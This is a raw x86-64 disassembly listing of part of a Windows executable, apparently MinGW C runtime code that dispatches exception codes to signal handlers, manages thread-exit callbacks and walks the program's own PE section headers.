   140001e82:	ba 01 00 00 00       	mov    $0x1,%edx
   140001e87:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001e8c:	e8 cf 7e 00 00       	call   0x140009d60
   140001e91:	84 db                	test   %bl,%bl
   140001e93:	0f 85 c7 00 00 00    	jne    0x140001f60
   140001e99:	e8 d2 f9 ff ff       	call   0x140001870
   140001e9e:	e9 bd 00 00 00       	jmp    0x140001f60
   140001ea3:	3d 02 00 00 80       	cmp    $0x80000002,%eax
   140001ea8:	0f 84 b2 00 00 00    	je     0x140001f60
   140001eae:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
   140001eb3:	74 46                	je     0x140001efb
   140001eb5:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
   140001eba:	0f 84 a0 00 00 00    	je     0x140001f60
   140001ec0:	eb 61                	jmp    0x140001f23
   140001ec2:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001ec7:	e9 8e 00 00 00       	jmp    0x140001f5a
   140001ecc:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
   140001ed1:	75 50                	jne    0x140001f23
   140001ed3:	b9 04 00 00 00       	mov    $0x4,%ecx
   140001ed8:	31 d2                	xor    %edx,%edx
   140001eda:	e8 81 7e 00 00       	call   0x140009d60
   140001edf:	48 85 c0             	test   %rax,%rax
   140001ee2:	74 3f                	je     0x140001f23
   140001ee4:	48 83 f8 01          	cmp    $0x1,%rax
   140001ee8:	75 64                	jne    0x140001f4e
   140001eea:	ba 01 00 00 00       	mov    $0x1,%edx
   140001eef:	b9 04 00 00 00       	mov    $0x4,%ecx
   140001ef4:	e8 67 7e 00 00       	call   0x140009d60
   140001ef9:	eb 65                	jmp    0x140001f60
   140001efb:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140001f00:	31 d2                	xor    %edx,%edx
   140001f02:	e8 59 7e 00 00       	call   0x140009d60
   140001f07:	48 85 c0             	test   %rax,%rax
   140001f0a:	74 17                	je     0x140001f23
   140001f0c:	48 83 f8 01          	cmp    $0x1,%rax
   140001f10:	75 43                	jne    0x140001f55
   140001f12:	ba 01 00 00 00       	mov    $0x1,%edx
   140001f17:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140001f1c:	e8 3f 7e 00 00       	call   0x140009d60
   140001f21:	eb 3d                	jmp    0x140001f60
   140001f23:	48 8b 05 06 bf 28 00 	mov    0x28bf06(%rip),%rax        # 0x14028de30
   140001f2a:	48 85 c0             	test   %rax,%rax
   140001f2d:	74 14                	je     0x140001f43
   140001f2f:	48 8b 15 d2 f0 28 00 	mov    0x28f0d2(%rip),%rdx        # 0x140291008
   140001f36:	48 89 f9             	mov    %rdi,%rcx
   140001f39:	48 83 c4 20          	add    $0x20,%rsp
   140001f3d:	5b                   	pop    %rbx
   140001f3e:	5f                   	pop    %rdi
   140001f3f:	5e                   	pop    %rsi
   140001f40:	48 ff e2             	rex.W jmp *%rdx
   140001f43:	31 f6                	xor    %esi,%esi
   140001f45:	eb 19                	jmp    0x140001f60
   140001f47:	b3 01                	mov    $0x1,%bl
   140001f49:	e9 19 ff ff ff       	jmp    0x140001e67
   140001f4e:	b9 04 00 00 00       	mov    $0x4,%ecx
   140001f53:	eb 05                	jmp    0x140001f5a
   140001f55:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140001f5a:	ff 15 a8 f0 28 00    	call   *0x28f0a8(%rip)        # 0x140291008
   140001f60:	89 f0                	mov    %esi,%eax
   140001f62:	48 83 c4 20          	add    $0x20,%rsp
   140001f66:	5b                   	pop    %rbx
   140001f67:	5f                   	pop    %rdi
   140001f68:	5e                   	pop    %rsi
   140001f69:	c3                   	ret
   140001f6a:	cc                   	int3
   140001f6b:	cc                   	int3
   140001f6c:	cc                   	int3
   140001f6d:	cc                   	int3
   140001f6e:	cc                   	int3
   140001f6f:	cc                   	int3
   140001f70:	ff e0                	jmp    *%rax
   140001f72:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001f79:	1f 84 00 00 00 00 00 
   140001f80:	c3                   	ret
   140001f81:	cc                   	int3
   140001f82:	cc                   	int3
   140001f83:	cc                   	int3
   140001f84:	cc                   	int3
   140001f85:	cc                   	int3
   140001f86:	cc                   	int3
   140001f87:	cc                   	int3
   140001f88:	cc                   	int3
   140001f89:	cc                   	int3
   140001f8a:	cc                   	int3
   140001f8b:	cc                   	int3
   140001f8c:	cc                   	int3
   140001f8d:	cc                   	int3
   140001f8e:	cc                   	int3
   140001f8f:	cc                   	int3
   140001f90:	48 89 c8             	mov    %rcx,%rax
   140001f93:	48 87 05 9e be 28 00 	xchg   %rax,0x28be9e(%rip)        # 0x14028de38
   140001f9a:	c3                   	ret
   140001f9b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001fa0:	48 8b 05 91 be 28 00 	mov    0x28be91(%rip),%rax        # 0x14028de38
   140001fa7:	c3                   	ret
   140001fa8:	cc                   	int3
   140001fa9:	cc                   	int3
   140001faa:	cc                   	int3
   140001fab:	cc                   	int3
   140001fac:	cc                   	int3
   140001fad:	cc                   	int3
   140001fae:	cc                   	int3
   140001faf:	cc                   	int3
   140001fb0:	48 8b 05 39 84 00 00 	mov    0x8439(%rip),%rax        # 0x14000a3f0
   140001fb7:	48 8b 00             	mov    (%rax),%rax
   140001fba:	c3                   	ret
   140001fbb:	cc                   	int3
   140001fbc:	cc                   	int3
   140001fbd:	cc                   	int3
   140001fbe:	cc                   	int3
   140001fbf:	cc                   	int3
   140001fc0:	48 8b 05 31 84 00 00 	mov    0x8431(%rip),%rax        # 0x14000a3f8
   140001fc7:	48 8b 00             	mov    (%rax),%rax
   140001fca:	c3                   	ret
   140001fcb:	cc                   	int3
   140001fcc:	cc                   	int3
   140001fcd:	cc                   	int3
   140001fce:	cc                   	int3
   140001fcf:	cc                   	int3
   140001fd0:	41 56                	push   %r14
   140001fd2:	56                   	push   %rsi
   140001fd3:	57                   	push   %rdi
   140001fd4:	53                   	push   %rbx
   140001fd5:	48 83 ec 28          	sub    $0x28,%rsp
   140001fd9:	31 f6                	xor    %esi,%esi
   140001fdb:	83 3d 5e be 28 00 00 	cmpl   $0x0,0x28be5e(%rip)        # 0x14028de40
   140001fe2:	74 54                	je     0x140002038
   140001fe4:	48 89 d7             	mov    %rdx,%rdi
   140001fe7:	89 cb                	mov    %ecx,%ebx
   140001fe9:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001fee:	ba 18 00 00 00       	mov    $0x18,%edx
   140001ff3:	e8 98 7d 00 00       	call   0x140009d90
   140001ff8:	48 85 c0             	test   %rax,%rax
   140001ffb:	74 36                	je     0x140002033
   140001ffd:	49 89 c6             	mov    %rax,%r14
   140002000:	89 18                	mov    %ebx,(%rax)
   140002002:	48 89 78 08          	mov    %rdi,0x8(%rax)
   140002006:	48 8d 3d 3b be 28 00 	lea    0x28be3b(%rip),%rdi        # 0x14028de48
   14000200d:	48 89 f9             	mov    %rdi,%rcx
   140002010:	ff 15 5a 9c 00 00    	call   *0x9c5a(%rip)        # 0x14000bc70
   140002016:	48 8b 05 53 be 28 00 	mov    0x28be53(%rip),%rax        # 0x14028de70
   14000201d:	49 89 46 10          	mov    %rax,0x10(%r14)
   140002021:	4c 89 35 48 be 28 00 	mov    %r14,0x28be48(%rip)        # 0x14028de70
   140002028:	48 89 f9             	mov    %rdi,%rcx
   14000202b:	ff 15 57 9c 00 00    	call   *0x9c57(%rip)        # 0x14000bc88
   140002031:	eb 05                	jmp    0x140002038
   140002033:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140002038:	89 f0                	mov    %esi,%eax
   14000203a:	48 83 c4 28          	add    $0x28,%rsp
   14000203e:	5b                   	pop    %rbx
   14000203f:	5f                   	pop    %rdi
   140002040:	5e                   	pop    %rsi
   140002041:	41 5e                	pop    %r14
   140002043:	c3                   	ret
   140002044:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000204b:	00 00 00 00 00 
   140002050:	56                   	push   %rsi
   140002051:	48 83 ec 20          	sub    $0x20,%rsp
   140002055:	83 3d e4 bd 28 00 00 	cmpl   $0x0,0x28bde4(%rip)        # 0x14028de40
   14000205c:	74 71                	je     0x1400020cf
   14000205e:	89 ce                	mov    %ecx,%esi
   140002060:	48 8d 0d e1 bd 28 00 	lea    0x28bde1(%rip),%rcx        # 0x14028de48
   140002067:	ff 15 03 9c 00 00    	call   *0x9c03(%rip)        # 0x14000bc70
   14000206d:	48 8b 0d fc bd 28 00 	mov    0x28bdfc(%rip),%rcx        # 0x14028de70
   140002074:	48 85 c9             	test   %rcx,%rcx
   140002077:	74 49                	je     0x1400020c2
   140002079:	8b 01                	mov    (%rcx),%eax
   14000207b:	39 f0                	cmp    %esi,%eax
   14000207d:	75 04                	jne    0x140002083
   14000207f:	31 c0                	xor    %eax,%eax
   140002081:	eb 24                	jmp    0x1400020a7
   140002083:	48 89 ca             	mov    %rcx,%rdx
   140002086:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000208d:	00 00 00 
   140002090:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140002094:	48 85 c9             	test   %rcx,%rcx
   140002097:	74 29                	je     0x1400020c2
   140002099:	44 8b 01             	mov    (%rcx),%r8d
   14000209c:	48 89 d0             	mov    %rdx,%rax
   14000209f:	48 89 ca             	mov    %rcx,%rdx
   1400020a2:	41 39 f0             	cmp    %esi,%r8d
   1400020a5:	75 e9                	jne    0x140002090
   1400020a7:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   1400020ab:	48 85 c0             	test   %rax,%rax
   1400020ae:	74 06                	je     0x1400020b6
   1400020b0:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1400020b4:	eb 07                	jmp    0x1400020bd
   1400020b6:	48 89 15 b3 bd 28 00 	mov    %rdx,0x28bdb3(%rip)        # 0x14028de70
   1400020bd:	e8 de 7c 00 00       	call   0x140009da0
   1400020c2:	48 8d 0d 7f bd 28 00 	lea    0x28bd7f(%rip),%rcx        # 0x14028de48
   1400020c9:	ff 15 b9 9b 00 00    	call   *0x9bb9(%rip)        # 0x14000bc88
   1400020cf:	31 c0                	xor    %eax,%eax
   1400020d1:	48 83 c4 20          	add    $0x20,%rsp
   1400020d5:	5e                   	pop    %rsi
   1400020d6:	c3                   	ret
   1400020d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400020de:	00 00 
   1400020e0:	41 56                	push   %r14
   1400020e2:	56                   	push   %rsi
   1400020e3:	57                   	push   %rdi
   1400020e4:	53                   	push   %rbx
   1400020e5:	48 83 ec 28          	sub    $0x28,%rsp
   1400020e9:	83 fa 03             	cmp    $0x3,%edx
   1400020ec:	0f 87 80 01 00 00    	ja     0x140002272
   1400020f2:	89 d0                	mov    %edx,%eax
   1400020f4:	48 8d 0d 05 83 00 00 	lea    0x8305(%rip),%rcx        # 0x14000a400
   1400020fb:	48 63 04 81          	movslq (%rcx,%rax,4),%rax
   1400020ff:	48 01 c8             	add    %rcx,%rax
   140002102:	ff e0                	jmp    *%rax
   140002104:	83 3d 35 bd 28 00 00 	cmpl   $0x0,0x28bd35(%rip)        # 0x14028de40
   14000210b:	0f 84 07 01 00 00    	je     0x140002218
   140002111:	48 8d 0d 30 bd 28 00 	lea    0x28bd30(%rip),%rcx        # 0x14028de48
   140002118:	ff 15 52 9b 00 00    	call   *0x9b52(%rip)        # 0x14000bc70
   14000211e:	48 8b 3d 4b bd 28 00 	mov    0x28bd4b(%rip),%rdi        # 0x14028de70
   140002125:	48 85 ff             	test   %rdi,%rdi
   140002128:	0f 84 dd 00 00 00    	je     0x14000220b
   14000212e:	48 8b 1d 6b 9b 00 00 	mov    0x9b6b(%rip),%rbx        # 0x14000bca0
   140002135:	4c 8b 35 3c 9b 00 00 	mov    0x9b3c(%rip),%r14        # 0x14000bc78
   14000213c:	eb 0f                	jmp    0x14000214d
   14000213e:	66 90                	xchg   %ax,%ax
   140002140:	48 8b 7f 10          	mov    0x10(%rdi),%rdi
   140002144:	48 85 ff             	test   %rdi,%rdi
   140002147:	0f 84 be 00 00 00    	je     0x14000220b
   14000214d:	8b 0f                	mov    (%rdi),%ecx
   14000214f:	ff d3                	call   *%rbx
   140002151:	48 89 c6             	mov    %rax,%rsi
   140002154:	41 ff d6             	call   *%r14
   140002157:	85 c0                	test   %eax,%eax
   140002159:	75 e5                	jne    0x140002140
   14000215b:	48 85 f6             	test   %rsi,%rsi
   14000215e:	74 e0                	je     0x140002140
   140002160:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140002164:	48 89 f1             	mov    %rsi,%rcx
   140002167:	ff 15 9b ee 28 00    	call   *0x28ee9b(%rip)        # 0x140291008
   14000216d:	eb d1                	jmp    0x140002140
   14000216f:	83 3d ca bc 28 00 00 	cmpl   $0x0,0x28bcca(%rip)        # 0x14028de40
   140002176:	75 0d                	jne    0x140002185
   140002178:	48 8d 0d c9 bc 28 00 	lea    0x28bcc9(%rip),%rcx        # 0x14028de48
   14000217f:	ff 15 fb 9a 00 00    	call   *0x9afb(%rip)        # 0x14000bc80
   140002185:	c7 05 b1 bc 28 00 01 	movl   $0x1,0x28bcb1(%rip)        # 0x14028de40
   14000218c:	00 00 00 
   14000218f:	e9 de 00 00 00       	jmp    0x140002272
   140002194:	e8 d7 f6 ff ff       	call   0x140001870
   140002199:	e9 d4 00 00 00       	jmp    0x140002272
   14000219e:	83 3d 9b bc 28 00 00 	cmpl   $0x0,0x28bc9b(%rip)        # 0x14028de40
   1400021a5:	0f 84 c7 00 00 00    	je     0x140002272
   1400021ab:	48 8d 0d 96 bc 28 00 	lea    0x28bc96(%rip),%rcx        # 0x14028de48
   1400021b2:	ff 15 b8 9a 00 00    	call   *0x9ab8(%rip)        # 0x14000bc70
   1400021b8:	48 8b 3d b1 bc 28 00 	mov    0x28bcb1(%rip),%rdi        # 0x14028de70
   1400021bf:	48 85 ff             	test   %rdi,%rdi
   1400021c2:	0f 84 9d 00 00 00    	je     0x140002265
   1400021c8:	48 8b 1d d1 9a 00 00 	mov    0x9ad1(%rip),%rbx        # 0x14000bca0
   1400021cf:	4c 8b 35 a2 9a 00 00 	mov    0x9aa2(%rip),%r14        # 0x14000bc78
   1400021d6:	eb 11                	jmp    0x1400021e9
   1400021d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400021df:	00 
   1400021e0:	48 8b 7f 10          	mov    0x10(%rdi),%rdi
   1400021e4:	48 85 ff             	test   %rdi,%rdi
   1400021e7:	74 7c                	je     0x140002265
   1400021e9:	8b 0f                	mov    (%rdi),%ecx
   1400021eb:	ff d3                	call   *%rbx
   1400021ed:	48 89 c6             	mov    %rax,%rsi
   1400021f0:	41 ff d6             	call   *%r14
   1400021f3:	85 c0                	test   %eax,%eax
   1400021f5:	75 e9                	jne    0x1400021e0
   1400021f7:	48 85 f6             	test   %rsi,%rsi
   1400021fa:	74 e4                	je     0x1400021e0
   1400021fc:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140002200:	48 89 f1             	mov    %rsi,%rcx
   140002203:	ff 15 ff ed 28 00    	call   *0x28edff(%rip)        # 0x140291008
   140002209:	eb d5                	jmp    0x1400021e0
   14000220b:	48 8d 0d 36 bc 28 00 	lea    0x28bc36(%rip),%rcx        # 0x14028de48
   140002212:	ff 15 70 9a 00 00    	call   *0x9a70(%rip)        # 0x14000bc88
   140002218:	8b 05 22 bc 28 00    	mov    0x28bc22(%rip),%eax        # 0x14028de40
   14000221e:	83 f8 01             	cmp    $0x1,%eax
   140002221:	75 4f                	jne    0x140002272
   140002223:	48 8b 0d 46 bc 28 00 	mov    0x28bc46(%rip),%rcx        # 0x14028de70
   14000222a:	48 85 c9             	test   %rcx,%rcx
   14000222d:	74 12                	je     0x140002241
   14000222f:	90                   	nop
   140002230:	48 8b 71 10          	mov    0x10(%rcx),%rsi
   140002234:	e8 67 7b 00 00       	call   0x140009da0
   140002239:	48 89 f1             	mov    %rsi,%rcx
   14000223c:	48 85 f6             	test   %rsi,%rsi
   14000223f:	75 ef                	jne    0x140002230
   140002241:	48 c7 05 24 bc 28 00 	movq   $0x0,0x28bc24(%rip)        # 0x14028de70
   140002248:	00 00 00 00 
   14000224c:	c7 05 ea bb 28 00 00 	movl   $0x0,0x28bbea(%rip)        # 0x14028de40
   140002253:	00 00 00 
   140002256:	48 8d 0d eb bb 28 00 	lea    0x28bbeb(%rip),%rcx        # 0x14028de48
   14000225d:	ff 15 05 9a 00 00    	call   *0x9a05(%rip)        # 0x14000bc68
   140002263:	eb 0d                	jmp    0x140002272
   140002265:	48 8d 0d dc bb 28 00 	lea    0x28bbdc(%rip),%rcx        # 0x14028de48
   14000226c:	ff 15 16 9a 00 00    	call   *0x9a16(%rip)        # 0x14000bc88
   140002272:	b8 01 00 00 00       	mov    $0x1,%eax
   140002277:	48 83 c4 28          	add    $0x28,%rsp
   14000227b:	5b                   	pop    %rbx
   14000227c:	5f                   	pop    %rdi
   14000227d:	5e                   	pop    %rsi
   14000227e:	41 5e                	pop    %r14
   140002280:	c3                   	ret
   140002281:	cc                   	int3
   140002282:	cc                   	int3
   140002283:	cc                   	int3
   140002284:	cc                   	int3
   140002285:	cc                   	int3
   140002286:	cc                   	int3
   140002287:	cc                   	int3
   140002288:	cc                   	int3
   140002289:	cc                   	int3
   14000228a:	cc                   	int3
   14000228b:	cc                   	int3
   14000228c:	cc                   	int3
   14000228d:	cc                   	int3
   14000228e:	cc                   	int3
   14000228f:	cc                   	int3
   140002290:	56                   	push   %rsi
   140002291:	48 83 ec 20          	sub    $0x20,%rsp
   140002295:	89 ce                	mov    %ecx,%esi
   140002297:	e8 14 7b 00 00       	call   0x140009db0
   14000229c:	89 f1                	mov    %esi,%ecx
   14000229e:	48 8d 0c 49          	lea    (%rcx,%rcx,2),%rcx
   1400022a2:	48 c1 e1 04          	shl    $0x4,%rcx
   1400022a6:	48 01 c8             	add    %rcx,%rax
   1400022a9:	48 83 c4 20          	add    $0x20,%rsp
   1400022ad:	5e                   	pop    %rsi
   1400022ae:	c3                   	ret
   1400022af:	cc                   	int3
   1400022b0:	0f b7 11             	movzwl (%rcx),%edx
   1400022b3:	31 c0                	xor    %eax,%eax
   1400022b5:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   1400022bb:	75 1d                	jne    0x1400022da
   1400022bd:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   1400022c1:	81 3c 11 50 45 00 00 	cmpl   $0x4550,(%rcx,%rdx,1)
   1400022c8:	75 10                	jne    0x1400022da
   1400022ca:	0f b7 4c 11 18       	movzwl 0x18(%rcx,%rdx,1),%ecx
   1400022cf:	31 c0                	xor    %eax,%eax
   1400022d1:	81 f9 0b 02 00 00    	cmp    $0x20b,%ecx
   1400022d7:	0f 94 c0             	sete   %al
   1400022da:	c3                   	ret
   1400022db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400022e0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   1400022e4:	44 0f b7 44 01 06    	movzwl 0x6(%rcx,%rax,1),%r8d
   1400022ea:	45 85 c0             	test   %r8d,%r8d
   1400022ed:	74 2b                	je     0x14000231a
   1400022ef:	48 01 c1             	add    %rax,%rcx
   1400022f2:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400022f6:	48 01 c8             	add    %rcx,%rax
   1400022f9:	48 83 c0 18          	add    $0x18,%rax
   1400022fd:	eb 0a                	jmp    0x140002309
   1400022ff:	90                   	nop
   140002300:	48 83 c0 28          	add    $0x28,%rax
   140002304:	41 ff c8             	dec    %r8d
   140002307:	74 11                	je     0x14000231a
   140002309:	8b 48 0c             	mov    0xc(%rax),%ecx
   14000230c:	48 39 d1             	cmp    %rdx,%rcx
   14000230f:	77 ef                	ja     0x140002300
   140002311:	03 48 08             	add    0x8(%rax),%ecx
   140002314:	48 39 d1             	cmp    %rdx,%rcx
   140002317:	76 e7                	jbe    0x140002300
   140002319:	c3                   	ret
   14000231a:	31 c0                	xor    %eax,%eax
   14000231c:	c3                   	ret
   14000231d:	0f 1f 00             	nopl   (%rax)
   140002320:	56                   	push   %rsi
   140002321:	57                   	push   %rdi
   140002322:	53                   	push   %rbx
   140002323:	48 83 ec 20          	sub    $0x20,%rsp
   140002327:	48 89 ce             	mov    %rcx,%rsi
   14000232a:	e8 91 79 00 00       	call   0x140009cc0
   14000232f:	31 ff                	xor    %edi,%edi
   140002331:	48 83 f8 08          	cmp    $0x8,%rax
   140002335:	77 68                	ja     0x14000239f
   140002337:	48 8b 05 ca 7c 00 00 	mov    0x7cca(%rip),%rax        # 0x14000a008
   14000233e:	0f b7 08             	movzwl (%rax),%ecx
   140002341:	81 f9 4d 5a 00 00    	cmp    $0x5a4d,%ecx
   140002347:	75 56                	jne    0x14000239f
   140002349:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   14000234d:	81 3c 08 50 45 00 00 	cmpl   $0x4550,(%rax,%rcx,1)
   140002354:	75 47                	jne    0x14000239d
   140002356:	48 01 c8             	add    %rcx,%rax
   140002359:	0f b7 48 18          	movzwl 0x18(%rax),%ecx
   14000235d:	81 f9 0b 02 00 00    	cmp    $0x20b,%ecx
   140002363:	75 38                	jne    0x14000239d
   140002365:	0f b7 58 06          	movzwl 0x6(%rax),%ebx
   140002369:	85 db                	test   %ebx,%ebx
   14000236b:	74 30                	je     0x14000239d
   14000236d:	0f b7 48 14          	movzwl 0x14(%rax),%ecx
   140002371:	48 8d 3c 01          	lea    (%rcx,%rax,1),%rdi
   140002375:	48 83 c7 18          	add    $0x18,%rdi
   140002379:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002380:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140002386:	48 89 f9             	mov    %rdi,%rcx
   140002389:	48 89 f2             	mov    %rsi,%rdx
   14000238c:	e8 2f 7a 00 00       	call   0x140009dc0
   140002391:	85 c0                	test   %eax,%eax
   140002393:	74 0a                	je     0x14000239f
   140002395:	48 83 c7 28          	add    $0x28,%rdi
   140002399:	ff cb                	dec    %ebx
   14000239b:	75 e3                	jne    0x140002380
   14000239d:	31 ff                	xor    %edi,%edi
   14000239f:	48 89 f8             	mov    %rdi,%rax
   1400023a2:	48 83 c4 20          	add    $0x20,%rsp
   1400023a6:	5b                   	pop    %rbx
   1400023a7:	5f                   	pop    %rdi
   1400023a8:	5e                   	pop    %rsi
   1400023a9:	c3                   	ret
   1400023aa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400023b0:	48 8b 05 51 7c 00 00 	mov    0x7c51(%rip),%rax        # 0x14000a008
   1400023b7:	0f b7 10             	movzwl (%rax),%edx
   1400023ba:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   1400023c0:	75 5a                	jne    0x14000241c
   1400023c2:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   1400023c6:	81 3c 10 50 45 00 00 	cmpl   $0x4550,(%rax,%rdx,1)
   1400023cd:	75 4d                	jne    0x14000241c
   1400023cf:	48 01 d0             	add    %rdx,%rax
   1400023d2:	0f b7 50 18          	movzwl 0x18(%rax),%edx
   1400023d6:	81 fa 0b 02 00 00    	cmp    $0x20b,%edx
   1400023dc:	75 3e                	jne    0x14000241c
   1400023de:	0f b7 50 06          	movzwl 0x6(%rax),%edx
   1400023e2:	85 d2                	test   %edx,%edx
   1400023e4:	74 36                	je     0x14000241c
   1400023e6:	48 2b 0d 1b 7c 00 00 	sub    0x7c1b(%rip),%rcx        # 0x14000a008
   1400023ed:	44 0f b7 40 14       	movzwl 0x14(%rax),%r8d
   1400023f2:	4c 01 c0             	add    %r8,%rax
   1400023f5:	48 83 c0 18          	add    $0x18,%rax
   1400023f9:	eb 0d                	jmp    0x140002408
   1400023fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002400:	48 83 c0 28          	add    $0x28,%rax
   140002404:	ff ca                	dec    %edx
   140002406:	74 14                	je     0x14000241c
   140002408:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   14000240c:	4c 39 c1             	cmp    %r8,%rcx
   14000240f:	72 ef                	jb     0x140002400
   140002411:	44 03 40 08          	add    0x8(%rax),%r8d
   140002415:	4c 39 c1             	cmp    %r8,%rcx
   140002418:	73 e6                	jae    0x140002400
   14000241a:	eb 02                	jmp    0x14000241e
   14000241c:	31 c0                	xor    %eax,%eax
   14000241e:	c3                   	ret
   14000241f:	90                   	nop
   140002420:	48 8b 0d e1 7b 00 00 	mov    0x7be1(%rip),%rcx        # 0x14000a008
   140002427:	0f b7 11             	movzwl (%rcx),%edx
   14000242a:	31 c0                	xor    %eax,%eax
   14000242c:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   140002432:	75 21                	jne    0x140002455
   140002434:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   140002438:	81 3c 11 50 45 00 00 	cmpl   $0x4550,(%rcx,%rdx,1)
   14000243f:	75 14                	jne    0x140002455
   140002441:	44 0f b7 44 11 18    	movzwl 0x18(%rcx,%rdx,1),%r8d
   140002447:	41 81 f8 0b 02 00 00 	cmp    $0x20b,%r8d
   14000244e:	75 05                	jne    0x140002455
   140002450:	0f b7 44 11 06       	movzwl 0x6(%rcx,%rdx,1),%eax
   140002455:	c3                   	ret
   140002456:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000245d:	00 00 00 
   140002460:	48 8b 05 a1 7b 00 00 	mov    0x7ba1(%rip),%rax        # 0x14000a008
   140002467:	0f b7 10             	movzwl (%rax),%edx
   14000246a:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   140002470:	75 56                	jne    0x1400024c8
   140002472:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   140002476:	81 3c 10 50 45 00 00 	cmpl   $0x4550,(%rax,%rdx,1)
   14000247d:	75 49                	jne    0x1400024c8
   14000247f:	48 01 d0             	add    %rdx,%rax
   140002482:	0f b7 50 18          	movzwl 0x18(%rax),%edx
   140002486:	81 fa 0b 02 00 00    	cmp    $0x20b,%edx
   14000248c:	75 3a                	jne    0x1400024c8
   14000248e:	0f b7 50 06          	movzwl 0x6(%rax),%edx
   140002492:	85 d2                	test   %edx,%edx
   140002494:	74 32                	je     0x1400024c8
   140002496:	44 0f b7 40 14       	movzwl 0x14(%rax),%r8d
   14000249b:	4c 01 c0             	add    %r8,%rax
   14000249e:	48 83 c0 18          	add    $0x18,%rax
   1400024a2:	eb 14                	jmp    0x1400024b8
   1400024a4:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400024ab:	00 00 00 00 00 
   1400024b0:	48 83 c0 28          	add    $0x28,%rax
   1400024b4:	ff ca                	dec    %edx
   1400024b6:	74 10                	je     0x1400024c8
   1400024b8:	f6 40 27 20          	testb  $0x20,0x27(%rax)
   1400024bc:	74 f2                	je     0x1400024b0
   1400024be:	48 85 c9             	test   %rcx,%rcx
   1400024c1:	74 07                	je     0x1400024ca
   1400024c3:	48 ff c9             	dec    %rcx
   1400024c6:	eb e8                	jmp    0x1400024b0
   1400024c8:	31 c0                	xor    %eax,%eax
   1400024ca:	c3                   	ret
   1400024cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400024d0:	48 8b 05 31 7b 00 00 	mov    0x7b31(%rip),%rax        # 0x14000a008
   1400024d7:	0f b7 08             	movzwl (%rax),%ecx
   1400024da:	81 f9 4d 5a 00 00    	cmp    $0x5a4d,%ecx
   1400024e0:	75 1a                	jne    0x1400024fc
   1400024e2:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   1400024e6:	81 3c 08 50 45 00 00 	cmpl   $0x4550,(%rax,%rcx,1)
   1400024ed:	75 0d                	jne    0x1400024fc
   1400024ef:	0f b7 4c 08 18       	movzwl 0x18(%rax,%rcx,1),%ecx
   1400024f4:	81 f9 0b 02 00 00    	cmp    $0x20b,%ecx
   1400024fa:	74 02                	je     0x1400024fe
   1400024fc:	31 c0                	xor    %eax,%eax
   1400024fe:	c3                   	ret
   1400024ff:	90                   	nop
   140002500:	48 8b 15 01 7b 00 00 	mov    0x7b01(%rip),%rdx        # 0x14000a008
   140002507:	44 0f b7 02          	movzwl (%rdx),%r8d
   14000250b:	31 c0                	xor    %eax,%eax
   14000250d:	41 81 f8 4d 5a 00 00 	cmp    $0x5a4d,%r8d
   140002514:	75 70                	jne    0x140002586
   140002516:	4c 63 42 3c          	movslq 0x3c(%rdx),%r8
   14000251a:	42 81 3c 02 50 45 00 	cmpl   $0x4550,(%rdx,%r8,1)
   140002521:	00 
   140002522:	75 62                	jne    0x140002586
   140002524:	4c 01 c2             	add    %r8,%rdx
   140002527:	44 0f b7 42 18       	movzwl 0x18(%rdx),%r8d
   14000252c:	41 81 f8 0b 02 00 00 	cmp    $0x20b,%r8d
   140002533:	75 51                	jne    0x140002586
   140002535:	44 0f b7 42 06       	movzwl 0x6(%rdx),%r8d
   14000253a:	4d 85 c0             	test   %r8,%r8
   14000253d:	74 47                	je     0x140002586
   14000253f:	48 2b 0d c2 7a 00 00 	sub    0x7ac2(%rip),%rcx        # 0x14000a008
   140002546:	0f b7 42 14          	movzwl 0x14(%rdx),%eax
   14000254a:	48 01 d0             	add    %rdx,%rax
   14000254d:	48 83 c0 18          	add    $0x18,%rax
   140002551:	49 c1 e0 03          	shl    $0x3,%r8
   140002555:	4f 8d 04 80          	lea    (%r8,%r8,4),%r8
   140002559:	31 d2                	xor    %edx,%edx
   14000255b:	eb 0c                	jmp    0x140002569
   14000255d:	0f 1f 00             	nopl   (%rax)
